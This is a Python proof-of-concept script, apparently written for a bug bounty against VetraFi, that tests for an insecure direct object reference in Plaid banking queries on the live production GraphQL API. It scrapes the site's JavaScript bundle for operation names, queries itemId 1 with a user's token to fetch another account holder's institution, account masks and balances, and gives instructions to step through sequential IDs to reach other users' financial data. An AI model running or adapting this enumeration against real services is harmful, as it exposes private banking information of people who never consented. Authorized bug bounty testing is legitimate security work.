"""
VetraFi Bug Bounty - Plaid IDOR Test PoC
Tests: GetPlaidItemDetails, GetMultiplePlaidItemDetails authorization
NOTE: Requires a valid JWT token to test
"""

import urllib.request
import urllib.error
import json
import sys

API_TARGET = "https://api.vetrafi.com/graphql"
PASS = 0
FAIL = 0

def test(name, condition, detail=""):
    global PASS, FAIL
    if condition:
        print(f"  [PASS] {name}")
        PASS += 1
    else:
        print(f"  [FAIL] {name} {detail}")
        FAIL += 1

print("=" * 60)
print("VetraFi Plaid IDOR Test PoC")
print("=" * 60)
print("\n[*] This PoC requires a valid JWT token from an authenticated session.")
print("[*] Set the TOKEN environment variable or pass it as --token argument.")
print()

# Check for token
token = None
if len(sys.argv) > 1 and sys.argv[1] == "--token" and len(sys.argv) > 2:
    token = sys.argv[2]

if not token:
    print("[!] No token provided. Running in discovery mode only.")
    print()

# Test 1: Verify Plaid queries exist
print("\n[Test 1] Plaid query enumeration from JS")
WEB_TARGET = "https://app.vetrafi.com/_next/static/chunks/app/layout-8455ea0eb07ed5fd.js?dpl=dpl_GUvMDsDgJdmAoAkau4bMeyXh8rsp"
try:
    req = urllib.request.Request(WEB_TARGET,
        headers={"User-Agent": "Mozilla/5.0 PoC"})
    resp = urllib.request.urlopen(req, timeout=30)
    js = resp.read().decode('utf-8', errors='replace')
    
    plaid_ops = []
    keywords = ['GetPlaidItemDetails', 'GetMultiplePlaidItemDetails', 
                'RemovePlaidItem', 'UpdatePlaidAccountsForItem',
                'GetPlaidItems', 'CheckIfInstitutionIsConnected',
                'ExchangePlaidPublicToken', 'GetPlaidLinkToken',
                'GetPlaidInstitutionByPlaidId']
    
    for kw in keywords:
        if kw in js:
            plaid_ops.append(kw)
    
    test("Plaid operations in JS", len(plaid_ops) >= 5,
         f"(Found {len(plaid_ops)}: {', '.join(plaid_ops)})")
    
    # Check for itemId parameter type
    import re
    item_id_refs = re.findall(r'itemId:\s*(\S+)', js)
    test("itemId parameter found", len(item_id_refs) > 0,
         f"(Found in {len(item_id_refs)} places)")
    print(f"  [INFO] itemId types found: {', '.join(set(item_id_refs))}")
    
except Exception as e:
    test("JS bundle accessible", False, f"(Error: {e})")

# Test 2: Try unauthorized access to Plaid queries
if token:
    print("\n[Test 2] Plaid query authorization test")
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 PoC"
    }
    
    # Test with itemId=1 (likely not owned by the token's user)
    try:
        data = json.dumps({
            "query": "{ getPlaidItemDetails(itemId: 1) { id institutionName accounts { name type mask balance { current } } } }"
        }).encode()
        req = urllib.request.Request(API_TARGET, data=data, headers=headers)
        resp = urllib.request.urlopen(req, timeout=15)
        body = json.loads(resp.read())
        
        has_data = body.get("data", {}).get("getPlaidItemDetails") is not None
        has_error = len(body.get("errors", [])) > 0
        
        if has_data:
            print(f"  [WARNING] Item 1 returned data without ownership check!")
            print(f"  [DATA] {json.dumps(body['data']['getPlaidItemDetails'], indent=2)[:500]}")
        elif has_error:
            msg = body['errors'][0].get('message', '')
            print(f"  [OK] Properly blocked: {msg[:100]}")
            test("Authorization enforced on foreign item ID", True, "")
        else:
            print(f"  [INFO] Response: {json.dumps(body)[:200]}")
    except Exception as e:
        print(f"  [INFO] Error: {e}")
else:
    print("\n[Test 2] SKIPPED - requires JWT token")

print(f"\n{'=' * 60}")
print(f"Results: {PASS} passed, {FAIL} failed")
print(f"{'=' * 60}")

print("\n[*] MANUAL TEST INSTRUCTIONS (when you have a token):")
print("  1. Replace YOUR_TOKEN with actual JWT")
print(f"  2. Run: python poc/plaid_idor_test.py --token YOUR_TOKEN")
print("  3. Try sequential itemIds: 1, 2, 3, 100, 1000")
print("  4. Check if responses return data from OTHER users' accounts")

sys.exit(0 if FAIL == 0 else 1)
